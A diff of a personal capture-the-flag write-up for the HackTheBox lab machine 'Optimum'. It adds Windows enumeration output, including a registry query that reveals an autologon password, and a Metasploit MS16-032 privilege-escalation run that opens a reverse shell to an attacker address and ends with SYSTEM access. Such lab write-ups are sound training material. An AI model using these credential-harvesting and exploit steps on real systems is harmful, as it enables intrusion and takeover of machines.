@@ -1,7 +1,7 @@
 # Optimum 10.10.10.8 - Windows
 
  - __User__: 007 - 1st Attempt
- - __Root__:
+ - __Root__: 007 - 1st Attempt
 
 ## Initial Attempt, 05/06/2020
 
@@ -178,10 +178,9 @@ These Windows services are started:
 
 
 ```
+`C:\>wmic qfe get Caption,Description,HotFixID,InstalledOn`
 
 ```powershell
-C:\>wmic qfe get Caption,Description,HotFixID,InstalledOn
-wmic qfe get Caption,Description,HotFixID,InstalledOn
 Caption                                     Description      HotFixID   InstalledOn
                                             Update           KB2959936  11/22/2014
 http://support.microsoft.com/?kbid=2896496  Update           KB2896496  11/22/2014
@@ -215,10 +214,10 @@ http://support.microsoft.com/?kbid=3000850  Update           KB3000850  11/22/20
 http://support.microsoft.com/?kbid=3003057  Security Update  KB3003057  11/22/2014
 http://support.microsoft.com/?kbid=3014442  Update           KB3014442  11/22/2014
 ```
-```powershell
-C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
+`C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
+
+```powershell
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
     LegalNoticeText    REG_SZ
@@ -245,4 +244,32 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     AutoAdminLogon    REG_SZ    1
     DefaultUsername    REG_SZ    kostas
     DefaultPassword    REG_SZ    kdeEjDowkS*
+```
+
+### Priv Esc from kostas->root
+
+Googling for "windows 2012 r2 privilege escalation" leads to exploit-db (https://www.exploit-db.com/exploits/39719). This can be found in msfconsole.
+
+```powershell
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.53:8725
+[+] Compressed size: 1016
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\ZuvTVoAH.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3592
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+
+                       [by b33f -> @FuzzySec]
+
+```
+
+```powershell
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
 ```
